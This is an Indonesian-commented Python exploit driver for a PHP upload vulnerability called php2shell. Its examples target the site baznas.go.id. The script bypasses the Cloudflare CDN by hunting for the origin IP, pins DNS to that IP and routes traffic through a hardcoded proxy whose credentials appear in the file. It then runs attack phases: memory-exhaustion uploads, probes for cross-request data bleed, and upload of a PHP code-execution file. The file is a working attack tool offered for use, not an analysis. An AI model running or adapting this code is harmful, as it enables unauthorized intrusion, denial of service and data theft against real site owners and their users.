#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
find_php2shell_uploads.py  v3
php2shell (CVE-2026-109618 / CVE-2026-109619) recon + exploit driver.

Baru di v3:
  * auto-detect Cloudflare / CDN di depan target
  * auto-discovery IP origin (crt.sh + wordlist + filter CIDR Cloudflare + verifikasi live)
  * DNS pinning transparan -> keep-alive benar-benar sampai ke worker origin
  * fingerprint versi PHP + SAPI (easter-egg expose_php + header)
  * probe endpoint POST-only via fallback (GET 404/405 -> coba POST multipart)
  * reflector finder supaya engine stale/control punya sinyal untuk diukur
  * phase 'all' jadi default

Contoh:
  python find_php2shell_uploads.py --url https://baznas.go.id/ --exploit --phase all
  python find_php2shell_uploads.py --url https://baznas.go.id/ --origin-ip 34.1.2.3 --exploit --phase all --direct
"""

import argparse, ipaddress, json, random, re, socket, string, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) php2shell-recon/3.0"
PROXY = "http://user23:CVSLAN5rbQsB@proxy.hypeproxy.site:1023"

CF_NETS = [ipaddress.ip_network(n) for n in [
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", "104.24.0.0/14",
    "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", "162.158.0.0/15", "172.64.0.0/13",
    "173.245.48.0/20", "188.114.96.0/20", "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "2400:cb00::/32", "2606:4700::/32", "2803:f800::/32", "2405:b500::/32", "2405:8100::/32",
    "2a06:98c0::/29", "2c0f:f248::/32",
]]

WORDLIST = [
    "/", "/index.php",
    "/proses-pengaduan", "/form-pengaduan", "/form-pengaduan/gagal", "/pengaduan",
    "/suplier-submit", "/suplier", "/suplier-form",
    "/epertimbangan", "/epertimbangan/check_code",
    "/Epertimbangan/submit_form_permohonan", "/Epertimbangan/submit_form_calon",
    "/Service/submit_jemput_zakat", "/service/submit_jemput_zakat",
    "/assets/captcha/verifycaptcha.php", "/assets/captcha/captcha.php",
    "/kontak", "/contact", "/hubungi-kami", "/donasi", "/zakat",
    "/register", "/login", "/newsletter", "/subscribe",
    "/upload", "/api/upload", "/berita", "/artikel", "/laporan",
]

SUBDOMAIN_WL = [
    "www", "mail", "smtp", "webmail", "cpanel", "ftp", "portal", "dev", "staging",
    "test", "api", "admin", "intranet", "simba", "alpha14", "alpha2", "bucket-api",
    "cdn", "static", "vpn", "remote", "beta", "demo", "git", "jenkins", "sso",
    "login", "app", "dashboard", "backend", "old", "new", "db", "monitoring",
    "grafana", "mobile", "assets", "mail2", "mx", "ns1", "ns2",
]

PATCHED = {"8.5": (8, 5, 12), "8.4": (8, 4, 27), "8.3": (8, 3, 36), "8.2": (8, 2, 35)}


# ----------------------------------------------------------------- utils ---
JSON_OUTPUT = False

def log(msg, event=None, data=None):
    if JSON_OUTPUT:
        entry = {"timestamp": time.strftime("%Y-%m-%d %H:%M:%S"), "message": msg}
        if event:
            entry["event"] = event
        if data:
            entry["data"] = data
        print(json.dumps(entry, ensure_ascii=False), flush=True)
    else:
        print(msg, flush=True)


def extract_domain(host):
    if not host:
        return ""
    parts = host.lower().split(".")
    two_level_tlds = {
        "go.id", "co.id", "ac.id", "or.id", "net.id", "mil.id", "sch.id", "web.id", "my.id", "biz.id",
        "co.uk", "org.uk", "gov.uk", "com.au", "net.au", "org.au", "co.jp"
    }
    if len(parts) >= 3 and ".".join(parts[-2:]) in two_level_tlds:
        return ".".join(parts[-3:])
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return host


def rand_token(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def is_cf(ip):
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(a in n for n in CF_NETS)


def resolve(host):
    out = set()
    try:
        for fam, _, _, _, sa in socket.getaddrinfo(host, None):
            out.add(sa[0])
    except socket.gaierror:
        pass
    return sorted(out)


# ------------------------------------------------------------ DNS pinning --
_ORIG_GAI = socket.getaddrinfo


def pin_host(host, ip):
    def gai(h, *a, **kw):
        return _ORIG_GAI(ip if h == host else h, *a, **kw)
    socket.getaddrinfo = gai


def unpin_host():
    socket.getaddrinfo = _ORIG_GAI


# ------------------------------------------------------------ http plumbing -
def make_session(use_proxy):
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = UA
    s.headers["Connection"] = "keep-alive"
    retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[502, 503, 504])
    ad = HTTPAdapter(max_retries=retry, pool_connections=1, pool_maxsize=1, pool_block=True)
    s.mount("https://", ad)
    s.mount("http://", ad)
    if use_proxy:
        s.proxies = {"http": PROXY, "https": PROXY}
    return s


def build_multipart(fields, files=None, boundary=None):
    boundary = boundary or ("----P2S" + rand_token(16))
    crlf = "\r\n"
    b = bytearray()
    for k, v in (fields or {}).items():
        b += f"--{boundary}{crlf}".encode()
        b += f'Content-Disposition: form-data; name="{k}"{crlf}{crlf}'.encode()
        b += (v if isinstance(v, bytes) else str(v).encode()) + crlf.encode()
    for k, tup in (files or {}).items():
        fn, content, ct = tup
        b += f"--{boundary}{crlf}".encode()
        b += f'Content-Disposition: form-data; name="{k}"; filename="{fn}"{crlf}'.encode()
        b += f"Content-Type: {ct}{crlf}{crlf}".encode()
        b += (content if isinstance(content, bytes) else content.encode()) + crlf.encode()
    b += f"--{boundary}--{crlf}".encode()
    return bytes(b), boundary


def post_raw(session, url, body, boundary, timeout=60, headers=None):
    h = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    if headers:
        h.update(headers)
    try:
        return session.post(url, data=body, headers=h, timeout=timeout, allow_redirects=False)
    except Exception:
        return None


def get_safe(session, url, timeout=20):
    try:
        return session.get(url, timeout=timeout, allow_redirects=True)
    except Exception:
        return None


# ---------------------------------------------------------- CDN / origin ---
def detect_cdn(session, base):
    r = get_safe(session, base)
    if r is None:
        return {"cdn": False, "error": "unreachable"}
    h = {k.lower(): v for k, v in r.headers.items()}
    srv = h.get("server", "")
    cdn = ("cloudflare" in srv.lower() or "cf-ray" in h or "x-azure" in h
           or "x-cache" in h or "fastly" in srv.lower())
    return {
        "cdn": cdn,
        "server": srv,
        "cf_ray": h.get("cf-ray"),
        "via": h.get("via"),
        "x_powered_by": h.get("x-powered-by"),
        "x_cache": h.get("x-cache"),
    }


def crt_subdomains(domain, timeout=60):
    subs = set()
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json",
                         timeout=timeout, headers={"User-Agent": UA})
        for e in r.json():
            for n in e.get("name_value", "").split("\n"):
                n = n.strip().lower().rstrip(".")
                if n and "*" not in n:
                    subs.add(n)
    except Exception as e:
        log(f"  [!] crt.sh gagal: {e}")
    return subs


def title_of(html):
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.S | re.I)
    return re.sub(r"\s+", " ", m.group(1)).strip() if m else ""


def verify_origin(host, ip, timeout=15, baseline=None):
    pin_host(host, ip)
    try:
        s = requests.Session()
        s.verify = False
        r = s.get(f"https://{host}/", timeout=timeout, allow_redirects=False,
                  headers={"User-Agent": UA})
        srv = r.headers.get("Server", "")
        h = {k.lower() for k in r.headers}
        iscf = "cloudflare" in srv.lower() or "cf-ray" in h
        score = 0
        t = title_of(r.text)
        if not iscf:
            score += 40
        if r.status_code == 200:
            score += 20
        if srv and "cloudflare" not in srv.lower():
            score += 10
        if baseline:
            btitle = baseline.get("title", "")
            blen = baseline.get("len", 0)
            if btitle and t and t.lower() == btitle.lower():
                score += 40
            elif blen and abs(len(r.content) - blen) / max(blen, 1) < 0.2:
                score += 20
        return (not iscf), srv, r.status_code, score, t
    except Exception as e:
        return False, f"ERR {e}", None, 0, ""
    finally:
        unpin_host()


def discover_origin(domain, verify_host=None, baseline=None, verbose=True):
    verify_host = verify_host or domain
    cands = set(crt_subdomains(domain))
    cands |= {f"{w}.{domain}" for w in SUBDOMAIN_WL}
    cands.add(domain)
    if verbose:
        log(f"  [i] {len(cands)} kandidat subdomain, resolve + filter Cloudflare...",
            event="origin_discovery_start", data={"candidates_count": len(cands), "domain": domain})

    # Threaded DNS resolution agar cepat dan tidak freeze
    origins = []
    seen_ips = set()

    def resolve_sub(s):
        out = []
        for ip in resolve(s):
            if not is_cf(ip) and not ip.startswith("127."):
                out.append((s, ip))
        return out

    with ThreadPoolExecutor(max_workers=30) as ex:
        futs = [ex.submit(resolve_sub, s) for s in sorted(cands)]
        for f in as_completed(futs):
            for s, ip in f.result():
                if ip not in seen_ips:
                    seen_ips.add(ip)
                    origins.append((s, ip))

    if verbose:
        for s, ip in origins:
            log(f"      {s:<45} {ip:<18} <- kandidat origin",
                event="origin_candidate_found", data={"sub": s, "ip": ip})

    # verifikasi live dan beri skor berdasarkan respon
    good = []
    for s, ip in origins:
        ok, srv, code, score, title = verify_origin(verify_host, ip, baseline=baseline)
        if verbose:
            log(f"      verify {ip:<18} -> {'OK' if ok else 'no'} | {srv} | {code} | skor={score}",
                event="origin_verified", data={"ip": ip, "sub": s, "ok": ok, "server": srv, "status": code, "score": score, "title": title})
        if ok:
            good.append({"sub": s, "ip": ip, "server": srv, "status": code, "score": score, "title": title})

    good.sort(key=lambda c: -c.get("score", 0))
    return good


# ------------------------------------------------------------- discovery ---
def crawl_endpoints(session, base):
    eps = set()
    r = get_safe(session, base)
    if not r:
        return eps
    html = r.text
    for m in re.finditer(r'<form[^>]*action=["\']([^"\']+)', html, re.I):
        eps.add(urljoin(base, m.group(1)))
    for m in re.finditer(r'(?:href|src)=["\']([^"\']+\.(?:php|html?))', html, re.I):
        eps.add(urljoin(base, m.group(1)))
    return eps


def probe_endpoints(session, base, extra):
    found = []
    paths = list(dict.fromkeys(WORDLIST + [urlparse(u).path for u in extra]))
    for p in paths:
        url = urljoin(base, p)
        r = get_safe(session, url, timeout=15)
        code = r.status_code if r else None
        methods = []
        if code and code < 400:
            methods.append("GET")
        # POST fallback: endpoint POST-only sering balas 404/405/500 ke GET
        body, b = build_multipart({"p2s_probe": "1"})
        rp = post_raw(session, url, body, b, timeout=20)
        pcode = rp.status_code if rp else None
        if pcode is not None and pcode < 500:
            methods.append("POST")
        if methods:
            found.append({"url": url, "get": code, "post": pcode, "methods": methods})
    return found


def find_reflector(session, endpoints):
    hits = []
    for ep in endpoints:
        vals = {f"p2sr{i}": f"P2SR{i}_{rand_token(6)}" for i in range(3)}
        body, b = build_multipart(vals)
        r = post_raw(session, ep, body, b, timeout=25)
        if r is None:
            continue
        got = [k for k, v in vals.items() if v in r.text]
        if got:
            hits.append({"url": ep, "fields": got})
    return hits


# --------------------------------------------------------------- engines ---
def engine_marker(session, endpoints, out):
    for ep in endpoints:
        m = "P2S_MARK_" + rand_token(8)
        body, b = build_multipart({"p2s": m, "PHP_SESSION_UPLOAD_PROGRESS": m})
        r = post_raw(session, ep, body, b, timeout=30)
        rec = {"url": ep, "status": (r.status_code if r else None),
               "len": (len(r.content) if r else 0),
               "reflected": bool(r and m in r.text)}
        out["marker"].append(rec)
        log(f"    marker  {ep} -> {rec['status']} refl={rec['reflected']}")


def engine_oom(session, endpoints, out, max_mb=32):
    for ep in endpoints:
        for mb in [0, 1, 2, 4, 8, 16, 32]:
            if mb > max_mb:
                break
            chunk = b"A" * (mb * 1024 * 1024) if mb else b"x"
            fname = ("f" * 200) + ".txt"
            files = {"userfile": (fname, chunk, "application/octet-stream")}
            body, b = build_multipart({"PHP_SESSION_UPLOAD_PROGRESS": "P2S_OOM"}, files)
            t0 = time.time()
            r = post_raw(session, ep, body, b, timeout=180)
            dt = round(time.time() - t0, 2)
            rec = {"url": ep, "mb": mb, "status": (r.status_code if r else None),
                   "time": dt, "len": (len(r.content) if r else 0)}
            out["oom"].append(rec)
            log(f"    oom     {ep} {mb}MB -> {rec['status']} {dt}s")


def engine_stale(session, endpoints, out, verify=3):
    for ep in endpoints:
        for i in range(verify):
            m = "P2S_STALE_" + rand_token(8)
            pb, pbn = build_multipart({"poison": m, "PHP_SESSION_UPLOAD_PROGRESS": m})
            post_raw(session, ep, pb, pbn, timeout=30)
            vb, vbn = build_multipart({"victim": "1"})
            r = post_raw(session, ep, vb, vbn, timeout=30)
            bleed = bool(r and m in r.text)
            out["stale"].append({"url": ep, "iter": i, "bleed": bleed})
            log(f"    stale   {ep} iter{i} bleed={bleed}")


def engine_control(session, endpoints, out):
    for ep in endpoints:
        m = "P2S_CTRL_" + rand_token(8)
        hdr = {"X-P2S": m, "Cookie": f"p2s={m}"}
        pb, pbn = build_multipart({"p2s": m, "PHP_SESSION_UPLOAD_PROGRESS": m})
        post_raw(session, ep + "?p2s=" + m, pb, pbn, timeout=30, headers=hdr)
        vb, vbn = build_multipart({"t": "1"})
        r = post_raw(session, ep, vb, vbn, timeout=30)
        bleed = bool(r and m in r.text)
        out["control"].append({"url": ep, "bleed": bleed})
        log(f"    control {ep} bleed={bleed}")


def engine_sessfile(session, endpoints, out):
    payload = '<?php echo "P2S_RCE"; ?>'
    for ep in endpoints:
        m = "P2S_SESS_" + rand_token(8)
        files = {"userfile": (f"{m}.php", payload, "application/x-php")}
        body, b = build_multipart({"PHP_SESSION_UPLOAD_PROGRESS": m}, files)
        r = post_raw(session, ep, body, b, timeout=30)
        sid = None
        if r is not None:
            for c in r.cookies:
                if c.name.lower() in ("phpsessid", "ci_session"):
                    sid = c.value
        out["sessfile"].append({"url": ep, "status": (r.status_code if r else None),
                                "sessid": sid, "len": (len(r.content) if r else 0)})
        log(f"    sessfile {ep} -> {out['sessfile'][-1]['status']} sid={sid}")


# ---------------------------------------------------------------- helpers --
def probe_php_version(session, base):
    try:
        r = session.get(base + "?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000", timeout=15)
        m = re.search(r"PHP/(\d+\.\d+\.\d+)", r.text) or \
            re.search(r"PHP Version (\d+\.\d+\.\d+)", r.text)
        return m.group(1) if m else None
    except Exception:
        return None


def is_vulnerable(ver):
    if not ver:
        return None
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", str(ver))
    if not m:
        return None
    parts = tuple(int(x) for x in m.groups())
    key = f"{parts[0]}.{parts[1]}"
    if key in PATCHED:
        return parts < PATCHED[key]
    return parts < (8, 5, 12)


# ------------------------------------------------------------------ main ---
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target", nargs="?", default=None, help="Target URL (posisional, misal: https://baznas.go.id/)")
    ap.add_argument("--url", default=None, help="Target URL (opsional jika argumen posisional diisi)")
    ap.add_argument("--enum-domain", default=None,
                    help="domain untuk enumerasi CT (default: host target)")
    ap.add_argument("--origin-ip", default=None, help="paksa IP origin (lewati discovery)")
    ap.add_argument("--no-origin", action="store_true", help="jangan cari/ pakai origin")
    ap.add_argument("--direct", action="store_true", help="bypass HypeProxy")
    ap.add_argument("--exploit", action="store_true")
    ap.add_argument("--phase", default="all",
                    help="all | marker,reflect,oom,stale,control,sessfile")
    ap.add_argument("--verify", type=int, default=3, help="jumlah ulangan uji stale")
    ap.add_argument("--max-mb", type=int, default=32, help="batas atas eskalasi OOM")
    ap.add_argument("-o", "--output", default="php2shell_report.json")
    ap.add_argument("--json", action="store_true", help="Format output terminal dalam JSON lines (NDJSON)")
    args = ap.parse_args()

    raw_url = args.url or args.target
    if not raw_url:
        ap.error("Harap tentukan target URL (contoh: python find_php2shell_uploads.py https://baznas.go.id/ atau --url https://baznas.go.id/)")

    global JSON_OUTPUT
    JSON_OUTPUT = args.json

    base = raw_url if raw_url.endswith("/") else raw_url + "/"
    host = urlparse(base).hostname
    enum_domain = args.enum_domain or host          # enumerasi subdomain HOST, bukan go.id

    session = make_session(use_proxy=not args.direct)
    report = {
        "target": base,
        "host": host,
        "domain": enum_domain,
        "enum_domain": enum_domain,
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "edge": {},
        "origin": None,
        "origin_candidates": [],
        "php_version": None,
        "php_vulnerable": None,
        "endpoints": [],
        "reflectors": [],
        "phases": [],
        "marker": [],
        "oom": [],
        "stale": [],
        "control": [],
        "sessfile": [],
        "verdict": []
    }

    def save_report():
        try:
            with open(args.output, "w", encoding="utf-8") as fh:
                json.dump(report, fh, indent=2, ensure_ascii=False)
        except Exception:
            pass

    origin = None
    try:
        # --- 1. deteksi CDN ---
        log("[*] Fingerprint edge...", event="edge_start", data={"target": base})
        cdn = detect_cdn(session, base)
        report["edge"] = cdn
        save_report()
        log(f"    Server: {cdn.get('server')} | CF-RAY: {cdn.get('cf_ray')} | Via: {cdn.get('via')}",
            event="edge_result", data=cdn)

        if cdn.get("cdn"):
            log("[!] CDN terdeteksi -> keep-alive ke origin TIDAK valid tanpa bypass.",
                event="cdn_warning", data={"cdn": True})
        else:
            log("[+] Tidak ada CDN -> keep-alive langsung ke server. Uji stale valid.",
                event="cdn_status", data={"cdn": False})

        # Baseline untuk scoring origin
        baseline = {"title": "", "len": 0}
        try:
            r_base = session.get(base, timeout=10)
            if r_base is not None:
                baseline = {"title": title_of(r_base.text), "len": len(r_base.content)}
        except Exception:
            pass

        # --- 2. tentukan origin ---
        if args.origin_ip:
            origin = {"ip": args.origin_ip, "sub": "manual", "server": "?", "status": "?", "score": 100}
            log(f"[*] Origin dipaksa manual: {args.origin_ip}", event="origin_manual", data=origin)
        elif cdn.get("cdn") and not args.no_origin:
            log(f"[*] Cari IP origin untuk domain {enum_domain} (host: {host})...",
                event="origin_search_start", data={"domain": enum_domain, "host": host})
            cands = discover_origin(enum_domain, verify_host=host, baseline=baseline)
            report["origin_candidates"] = cands
            save_report()
            if cands:
                # BUANG sort nama, PAKAI SKOR tertinggi
                cands.sort(key=lambda c: -c.get("score", 0))
                origin = cands[0]
                log(f"[+] Origin terpilih (skor {origin.get('score', 0)}): {origin['ip']} ({origin['sub']}, Server: {origin['server']})",
                    event="origin_selected", data=origin)
            else:
                log("[!] Origin tidak ketemu -> tetap lewat Cloudflare, hasil stale mungkin tidak valid.",
                    event="origin_not_found")
        report["origin"] = origin
        save_report()

        if origin:
            pin_host(host, origin["ip"])
            log(f"[*] DNS dipin: {host} -> {origin['ip']} (SNI/Host tetap {host})",
                event="dns_pinned", data={"host": host, "ip": origin["ip"]})
            # cek keep-alive reuse
            try:
                t = requests.Session()
                t.verify = False
                r1 = t.get(base, timeout=15, headers={"User-Agent": UA})
                log(f"    probe origin: {r1.status_code} Server={r1.headers.get('Server')} "
                    f"X-Powered-By={r1.headers.get('X-Powered-By')}",
                    event="origin_probe", data={"status": r1.status_code, "server": r1.headers.get("Server")})
            except Exception as e:
                log(f"    [!] origin tidak responsif: {e}", event="origin_error", data={"error": str(e)})

        # --- 3. fingerprint PHP ---
        log("[*] Fingerprint PHP...", event="php_fingerprint_start")
        ver = probe_php_version(session, base) or cdn.get("x_powered_by")
        report["php_version"] = ver
        report["php_vulnerable"] = is_vulnerable(ver)
        save_report()
        if ver:
            v = report["php_vulnerable"]
            log(f"    PHP {ver} -> {'VULNERABLE' if v else 'patched' if v is False else '?'}",
                event="php_version_result", data={"version": ver, "vulnerable": v})
        else:
            log("    versi PHP tidak terekspos", event="php_version_result", data={"version": None})

        # --- 4. discovery endpoint ---
        log("[*] Crawl + probe endpoint...", event="crawl_start")
        eps = crawl_endpoints(session, base)
        found = probe_endpoints(session, base, eps)
        endpoints = [f["url"] for f in found if "POST" in f["methods"]]
        report["endpoints"] = found
        save_report()
        log(f"    {len(found)} endpoint hidup, {len(endpoints)} menerima POST",
            event="crawl_result", data={"found": len(found), "post_count": len(endpoints)})
        for f in found:
            log(f"      {f['url']}  GET={f['get']} POST={f['post']}",
                event="endpoint_found", data=f)

        # --- 5. cari reflector (sinyal untuk stale) ---
        log("[*] Cari endpoint yang memantulkan input...", event="reflector_search_start")
        reflectors = find_reflector(session, endpoints)
        report["reflectors"] = reflectors
        save_report()
        stale_targets = [r["url"] for r in reflectors] or endpoints
        if reflectors:
            log(f"[+] {len(reflectors)} reflector ditemukan -> dipakai untuk uji stale/control",
                event="reflectors_found", data={"count": len(reflectors), "targets": stale_targets})
        else:
            log("[-] tidak ada reflector -> uji stale pakai semua endpoint POST",
                event="reflectors_found", data={"count": 0, "targets": stale_targets})

        # --- 6. exploit ---
        if args.exploit:
            phases = args.phase.split(",")
            if "all" in phases:
                phases = ["marker", "oom", "stale", "control", "sessfile"]
            report["phases"] = phases
            for ph in phases:
                ph = ph.strip()
                log(f"[*] Phase: {ph}", event="phase_start", data={"phase": ph})
                if ph == "marker":
                    engine_marker(session, endpoints, report)
                elif ph == "oom":
                    engine_oom(session, endpoints, report, max_mb=args.max_mb)
                elif ph == "stale":
                    engine_stale(session, stale_targets, report, verify=args.verify)
                elif ph == "control":
                    engine_control(session, stale_targets, report)
                elif ph == "sessfile":
                    engine_sessfile(session, endpoints, report)
                save_report()

        # --- 7. verdict ---
        verdict = []
        if report.get("php_vulnerable"):
            verdict.append("PHP_VERSION_VULNERABLE")
        if any(r.get("bleed") for r in report.get("stale", [])):
            verdict.append("STALE_BLEED_CONFIRMED")
        if any(r.get("bleed") for r in report.get("control", [])):
            verdict.append("CONTROL_BLEED_CONFIRMED")
        if any(r.get("status") and r["status"] >= 500 for r in report.get("oom", [])):
            verdict.append("OOM_CRASH_OBSERVED")
        report["verdict"] = verdict or ["NO_SIGNAL"]
        save_report()

    finally:
        if origin:
            unpin_host()
        save_report()

    log(f"\n[=] Verdict: {', '.join(report['verdict'])}", event="verdict", data=report["verdict"])
    log(f"[=] Report saved to: {args.output}", event="report_saved", data={"file": args.output})


if __name__ == "__main__":
    main()